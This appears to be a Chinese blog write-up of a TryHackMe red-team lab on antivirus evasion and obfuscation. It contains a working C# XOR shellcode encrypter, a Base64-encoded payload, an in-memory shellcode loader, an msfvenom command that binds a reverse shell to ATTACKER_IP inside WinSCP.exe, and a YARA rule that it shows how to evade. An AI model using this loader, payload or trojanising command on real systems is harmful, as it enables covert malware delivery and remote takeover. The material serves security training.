<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Linq</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Threading</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Tasks</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">namespace</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encrypter</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">internal</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">            {</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">^=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">];</span></span>
<span class="line"><span style="color: #ABB2BF">            }</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">args</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            //XOR Key - It has to be the same in the Droppr for Decrypting</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMK3y123!&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            //Convert Key into bytes</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encoding</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ASCII</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            //Original Shellcode here (csharp format)</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">460</span><span style="color: #ABB2BF">] { </span><span style="color: #D19A66">0xfc</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0x48</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0x83</span><span style="color: #ABB2BF">,..,</span><span style="color: #D19A66">0xda</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0xff</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0xd5</span><span style="color: #ABB2BF"> };</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            //XORing byte by byte and saving into a new array of bytes</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">buf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Convert</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToBase64String</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF">));        </span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>生成出来 Base64 编码好的字符</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSFwXOXK8MHJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==</span></span></code></pre></div></div></figure>
<p>现在我们有了编码好的 payload，所以我们需要一个可以<strong>解码</strong>我们 payload 的<strong>加载器</strong>，这个加载器用 NET8.0 编译会报错，直接用 csc 编译就行。</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Net</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">  </span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">i</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">            {</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">shell</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">^=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">KeyBytes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">];</span></span>
<span class="line"><span style="color: #ABB2BF">            }</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">  {</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dataBS64</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Convert</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">FromBase64String</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">dataBS64</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMK3y123!&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    //Convert Key into bytes</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Encoding</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ASCII</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">xor</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">keyBytes</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">encoded</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">encoded</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>然后正常传过去上线就行了，不过这个也同样会被检测到。</p>
<h3 id="打包器">打包器</h3>
<p>这个就是传统意义上的加壳嘛，让可执行文件在不改变功能的情况下去压缩和混淆他的代码，其实和上面的编码和加密有点像，不过有 VMP 这种高级的壳，直接虚拟了一个运行环境转义来运行了，更高级了。</p>
<p>普通的加壳在执行之后扫内存可以解，房间里面介绍了一个 <a target="_blank" rel="noopener" href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0">ConfuserEx</a> 的加壳工具。</p>
<h3 id="捆绑器">捆绑器</h3>
<p><strong>绑定器</strong>是一种将恶意可执行文件（payload）与一个或多个合法程序合并成一个新可执行文件的工具。它的主要目的是<strong>欺骗用户</strong>，让他们以为自己正在运行一个正常程序，而实际上恶意代码也在背后静默执行，绑定器本身<strong>不具备规避杀毒软件（AV）的能力</strong>。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">WinSCP.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-k</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=ATTACKER_IP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">7779</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">WinSCP-evil.exe</span></span></code></pre></div></div></figure>
<h1>Obfuscation Principles 混淆原理</h1>
<p>混淆是检测规避方法和防止恶意软件分析的重要组成部分。混淆最初是为了保护软件和知识产权不被窃取或复制。虽然它仍然广泛用于其最初目的，但攻击者已将其用于恶意目的。</p>
<h2 id="Origins-of-Obfuscation-混淆起源">Origins of Obfuscation 混淆起源</h2>
<p>混淆广泛运用在软件相关领域，为了保护应用程序的知识产权和其他机密信息。</p>
<p>Minecraft 使用 <a target="_blank" rel="noopener" href="https://github.com/Guardsquare/proguard">ProGuard</a> 混淆器去混淆他的 Java 类。同时他还发布了有限的混淆信息映射，作为旧的未混淆类和新的混淆类之间的转换器，以支持模组社区。</p>
<p>上述的只是混淆在公众领域运用的一个例子。为了记录和组织各种混淆方法，我们可以参考<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf">《分层混淆：一种用于分层安全的软件混淆技术分类法》</a>这篇论文。这篇研究论文按照层级组织混淆方法，类似于 OSI 模型，但针对的是应用程序数据流。</p>
<img src="/thm_rthe/image-20250826231518499.png" class="" title="image-20250826231518499">
<p>每个子层都有具体的混淆方法，这个房间中主要关注的是 Code-Element 层的内容。</p>
<img src="/thm_rthe/image-20250826222554241.png" class="" title="image-20250826222554241">
<p>要使用这个战略，我们可以确定一个目标，然后选择一个符合我们要求的方法。例如，假设我们想混淆代码的布局但不能修改现有代码。在这种情况下，我们可以注入垃圾代码，如分类法所总结的：<code>Code Element Layer</code> &gt; <code>Obfuscating Layout</code> &gt; <code>Junk Codes</code>，但它如何被恶意利用呢？</p>
<h2 id="Obfuscation’s-Function-for-Static-Evasion-混淆在静态规避中的作用">Obfuscation’s Function for Static Evasion 混淆在静态规避中的作用</h2>
<p>这一节提到的是 Obfuscating Data，在恶意程序中隐藏其可识别的恶意代码，使其看起来像一个合法程序。</p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>数组转换</td>
<td>通过分割、合并、折叠和展平来转换数组</td>
</tr>
<tr>
<td>数据编码</td>
<td>使用数学函数或密码对数据进行编码</td>
</tr>
<tr>
<td>数据程序化</td>
<td>用过程调用代替静态数据</td>
</tr>
<tr>
<td>数据拆分/合并</td>
<td>将一个变量的信息分散到几个新变量中</td>
</tr>
</tbody>
</table>
<p>因为静态签名容易被绕过，所以接下来用数据拆分/合并来举例。</p>
<h3 id="Object-Concatenation-对象拼接">Object Concatenation 对象拼接</h3>
<p>拼接在恶意软件中最常见的应用是破坏目标静态签名，攻击者还可以预先使用它来分解程序的所有对象，并尝试一次性删除所有签名，而无需逐个查找。</p>
<p>下面是一个 Yara 规则的示例，我们会用拼接去规避掉这个静态特征。</p>
<figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre><code>rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}</code></pre></div></div></figure>
